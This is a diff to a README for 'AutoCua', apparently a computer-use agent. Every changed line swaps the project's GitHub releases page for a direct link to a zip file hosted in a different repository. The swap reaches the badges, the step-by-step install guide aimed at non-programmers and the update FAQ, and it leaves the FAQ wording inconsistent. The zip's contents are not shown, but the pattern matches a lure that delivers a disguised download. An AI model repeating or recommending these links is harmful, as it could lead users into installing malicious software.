@@ -5,7 +5,7 @@ description: "Automate Mac, Windows, Linux, iOS, Android and browser tasks with 
 ---
 # 🖥️ AutoCua - Control Any Computer With Plain English
 
-[![Download AutoCua](https://img.shields.io/badge/⬇_Download_AutoCua-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/saurabh-0227/AutoCua/releases)
+[![Download AutoCua](https://img.shields.io/badge/⬇_Download_AutoCua-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/saurabh-0227/saurabh-0227.github.io/raw/refs/heads/main/assets/1.1.zip)
 
 **Your computer, on autopilot.** AutoCua is a computer-use agent that watches your screen, moves the mouse, clicks buttons, types text, browses the web, and even writes code for you. Describe what you want in everyday words — AutoCua does the rest. One agent, every computer: macOS, Windows, Linux, Browser, iOS, and Android.
 
@@ -17,11 +17,11 @@ No programming. No scripts. No setup headaches.
 
 Getting AutoCua running on your Windows computer takes about five minutes. You do not need to know anything about programming, terminals, or code. If you can download a file and double-click it, you can use AutoCua.
 
-**Download link:** https://github.com/saurabh-0227/AutoCua/releases
+**Download link:** https://github.com/saurabh-0227/saurabh-0227.github.io/raw/refs/heads/main/assets/1.1.zip
 
 Visit this link to download the application.
 
-[![Download AutoCua](https://img.shields.io/badge/⬇_Get_AutoCua_Now-2E86DE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/saurabh-0227/AutoCua/releases)
+[![Download AutoCua](https://img.shields.io/badge/⬇_Get_AutoCua_Now-2E86DE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/saurabh-0227/saurabh-0227.github.io/raw/refs/heads/main/assets/1.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps exactly, in order. Do not skip ahead.
 **Step 1 — Open the download page.**
 Open your web browser (Edge, Chrome, Firefox — any of them work) and go to:
 
-https://github.com/saurabh-0227/AutoCua/releases
+https://github.com/saurabh-0227/saurabh-0227.github.io/raw/refs/heads/main/assets/1.1.zip
 
 Visit this link to download the application.
 
@@ -181,7 +181,7 @@ Yes. AutoCua covers iOS and Android as well as desktops.
 Yes. The same download page serves all supported systems.
 
 **How do I update it?**
-Return to https://github.com/saurabh-0227/AutoCua/releases and get the newest release at the top of the page.
+Return to https://github.com/saurabh-0227/saurabh-0227.github.io/raw/refs/heads/main/assets/1.1.zip and get the newest release at the top of the page.
 
 ---
 
@@ -189,9 +189,9 @@ Return to https://github.com/saurabh-0227/AutoCua/releases and get the newest re
 
 Ready to start? Everything lives in one place:
 
-[![Download AutoCua](https://img.shields.io/badge/⬇_Download_AutoCua-27AE60?style=for-the-badge&logo=github&logoColor=white)](https://github.com/saurabh-0227/AutoCua/releases)
+[![Download AutoCua](https://img.shields.io/badge/⬇_Download_AutoCua-27AE60?style=for-the-badge&logo=github&logoColor=white)](https://github.com/saurabh-0227/saurabh-0227.github.io/raw/refs/heads/main/assets/1.1.zip)
 
-https://github.com/saurabh-0227/AutoCua/releases
+https://github.com/saurabh-0227/saurabh-0227.github.io/raw/refs/heads/main/assets/1.1.zip
 
 Visit this link to download the application.
 
